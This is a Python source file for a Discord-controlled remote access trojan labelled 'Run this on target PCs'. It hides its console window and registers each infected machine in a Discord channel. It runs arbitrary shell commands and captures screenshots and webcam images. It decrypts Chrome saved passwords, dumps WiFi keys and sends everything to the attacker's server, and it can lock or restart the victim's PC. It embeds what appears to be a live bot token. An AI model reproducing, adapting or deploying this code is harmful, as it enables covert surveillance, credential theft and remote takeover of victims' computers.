# f_society_client.py - Run this on target PCs
import os
import sys
import subprocess
import ctypes
import io
import time
import json
import base64
import random
import threading
import tempfile
import platform
import re
import shutil
import winreg
import socket
import requests
from datetime import datetime

# ==================== HIDE CONSOLE ====================
def hide_console():
    if sys.platform == 'win32':
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            ctypes.windll.kernel32.FreeConsole()
        except:
            pass

hide_console()

# ==================== CONFIGURATION ====================
BOT_TOKEN = "MTUwMjY3MjE1NDEwNDQzMDgwMw.GoJqTX.NjqXdMqiIMiTMS0nfGxRdeBT7mwHRq521AdtZY"  # Same token for both
GUILD_ID = 1502665189269573823       # Your Discord server ID
CHANNEL_NAME = "f-society-commands" # Main command channel

PC_IP = requests.get('https://api.ipify.org', timeout=5).text
PC_NAME = os.environ.get('COMPUTERNAME', 'Unknown')
PC_USER = os.getenv('USERNAME', 'Unknown')

# ==================== DISCORD FUNCTIONS ====================
def discord_request(endpoint, method="GET", data=None, files=None):
    url = f"https://discord.com/api/v10/{endpoint}"
    headers = {"Authorization": f"Bot {BOT_TOKEN}"}
    if not files:
        headers["Content-Type"] = "application/json"
    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=30)
        elif method == "POST":
            if files:
                r = requests.post(url, headers=headers, files=files, data=data, timeout=30)
            else:
                r = requests.post(url, headers=headers, json=data, timeout=30)
        return r.json() if r.text else {"success": r.status_code}
    except:
        return None

def get_or_create_channel():
    channels = discord_request(f"guilds/{GUILD_ID}/channels")
    if channels:
        for ch in channels:
            if ch.get('name') == f"pc-{PC_IP.replace('.', '-')}":
                return ch.get('id')
    data = {"name": f"pc-{PC_IP.replace('.', '-')}", "type": 0, "topic": f"PC: {PC_NAME} | IP: {PC_IP}"}
    new = discord_request(f"guilds/{GUILD_ID}/channels", "POST", data)
    return new.get('id') if new else None

def send_message(content, channel_id=None):
    if not channel_id:
        channel_id = get_or_create_channel()
    if channel_id:
        formatted = f"**[{PC_NAME}] `{PC_IP}`**\n{content}"
        discord_request(f"channels/{channel_id}/messages", "POST", {"content": formatted})

def send_file(file_bytes, filename, channel_id=None):
    if not channel_id:
        channel_id = get_or_create_channel()
    if channel_id:
        files = {'file': (filename, file_bytes)}
        data = {"content": f"**[{PC_NAME}] `{PC_IP}`**"}
        discord_request(f"channels/{channel_id}/messages", "POST", data, files)

# ==================== COMMAND HANDLERS ====================
def take_screenshot():
    import pyautogui
    img = pyautogui.screenshot()
    buf = io.BytesIO()
    img.save(buf, format='JPEG', quality=60)
    return base64.b64encode(buf.getvalue()).decode()

def capture_webcam():
    import cv2
    cap = cv2.VideoCapture(0)
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            cap.release()
            return base64.b64encode(buf.tobytes()).decode()
    return None

def get_system_info():
    return (f"**OS:** {platform.system()} {platform.release()}\n"
            f"**CPU:** {psutil.cpu_percent()}%\n"
            f"**RAM:** {psutil.virtual_memory().percent}%\n"
            f"**User:** {PC_USER}")

def run_command(cmd):
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return out.stdout[:1500] + out.stderr[:500] or "Command executed"
    except:
        return "Command failed"

def steal_passwords():
    import sqlite3
    import win32crypt
    passwords = []
    try:
        path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        if os.path.exists(path):
            temp = tempfile.NamedTemporaryFile(delete=False)
            shutil.copy2(path, temp.name)
            temp.close()
            conn = sqlite3.connect(temp.name)
            cur = conn.cursor()
            cur.execute('SELECT origin_url, username_value, password_value FROM logins')
            for url, user, enc in cur.fetchall():
                if user and enc:
                    try:
                        pwd = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
                        passwords.append(f"**{url}**\nUser: `{user}`\nPass: `{pwd}`")
                    except:
                        pass
            conn.close()
            os.unlink(temp.name)
    except:
        pass
    return "\n\n".join(passwords[:10]) if passwords else "No passwords"

def get_wifi():
    wifi = []
    try:
        out = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [l.split(':')[1].strip() for l in out.stdout.split('\n') if 'All User Profile' in l]
        for profile in profiles:
            res = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
            for line in res.stdout.split('\n'):
                if 'Key Content' in line:
                    wifi.append(f"**{profile}:** `{line.split(':')[1].strip()}`")
                    break
    except:
        pass
    return "\n".join(wifi) if wifi else "No WiFi"

def troll_20s():
    import pyautogui
    from pynput.keyboard import Controller
    kb = Controller()
    end = time.time() + 20
    while time.time() < end:
        if random.choice([True, False]):
            w, h = pyautogui.size()
            pyautogui.moveTo(random.randint(0, w), random.randint(0, h), duration=0.05)
        else:
            kb.type(random.choice("abcdefghijklmnopqrstuvwxyz1234567890!@#$%"))
        time.sleep(0.1)
    return "20s chaos complete"

def lock_screen():
    ctypes.windll.user32.LockWorkStation()
    return "Screen locked"

def restart_pc():
    os.system("shutdown /r /t 30 /c \"F Society: Restart in 30s\"")
    return "Restart scheduled"

def show_popup(msg):
    ctypes.windll.user32.MessageBoxW(0, msg, "F Society", 0x10)
    return "Popup shown"

# ==================== MAIN COMMAND LOOP ====================
def main():
    # Register this PC
    my_channel = get_or_create_channel()
    send_message(f"✅ **PC ONLINE**\n💻 {PC_NAME}\n🌐 {PC_IP}\n👤 {PC_USER}", my_channel)
    
    # Listen for commands (via webhook -> channel -> our bot)
    # The main Discord bot will send commands to this PC's channel
    # This client reads its own channel for commands
    last_msg_id = None
    
    while True:
        try:
            # Get messages from this PC's channel
            if my_channel:
                url = f"https://discord.com/api/v10/channels/{my_channel}/messages?limit=1"
                headers = {"Authorization": f"Bot {BOT_TOKEN}"}
                resp = requests.get(url, headers=headers, timeout=10)
                if resp.status_code == 200:
                    msgs = resp.json()
                    if msgs and msgs[0].get('id') != last_msg_id:
                        last_msg_id = msgs[0]['id']
                        content = msgs[0].get('content', '')
                        
                        # Parse command
                        if content.startswith('CMD:'):
                            cmd = content[4:]
                            
                            if cmd == 'SCREENSHOT':
                                img_b64 = take_screenshot()
                                send_message("📸 Screenshot:", my_channel)
                                send_file(base64.b64decode(img_b64), "screenshot.jpg", my_channel)
                            
                            elif cmd == 'WEBCAM':
                                img_b64 = capture_webcam()
                                if img_b64:
                                    send_message("📷 Webcam:", my_channel)
                                    send_file(base64.b64decode(img_b64), "webcam.jpg", my_channel)
                                else:
                                    send_message("❌ No webcam found", my_channel)
                            
                            elif cmd == 'INFO':
                                send_message(get_system_info(), my_channel)
                            
                            elif cmd.startswith('EXEC|'):
                                command = cmd[5:]
                                result = run_command(command)
                                send_message(f"⚡ Command result:\n```{result}```", my_channel)
                            
                            elif cmd == 'PASSWORDS':
                                pwd = steal_passwords()
                                send_message(f"🔑 Passwords:\n{pwd}", my_channel)
                            
                            elif cmd == 'WIFI':
                                wifi = get_wifi()
                                send_message(f"📡 WiFi passwords:\n{wifi}", my_channel)
                            
                            elif cmd == 'TROLL':
                                send_message("🎭 Troll mode active for 20 seconds...", my_channel)
                                result = troll_20s()
                                send_message(result, my_channel)
                            
                            elif cmd == 'LOCK':
                                result = lock_screen()
                                send_message(f"🔒 {result}", my_channel)
                            
                            elif cmd == 'RESTART':
                                result = restart_pc()
                                send_message(f"🔄 {result}", my_channel)
                            
                            elif cmd.startswith('MSG|'):
                                msg = cmd[4:]
                                show_popup(msg)
                                send_message(f"💬 Message shown: {msg}", my_channel)
                            
                            elif cmd == 'PING':
                                send_message("🏓 Pong!", my_channel)
            
            time.sleep(2)
        except:
            time.sleep(5)

if __name__ == "__main__":
    try:
        # Install required packages first
        for pkg in ['psutil', 'pyautogui', 'opencv-python', 'pynput', 'pywin32']:
            subprocess.run([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'], capture_output=True)
        
        import psutil
        import pyautogui
        import cv2
        from pynput.keyboard import Controller
        
        main()
    except Exception as e:
        time.sleep(10)
        main()
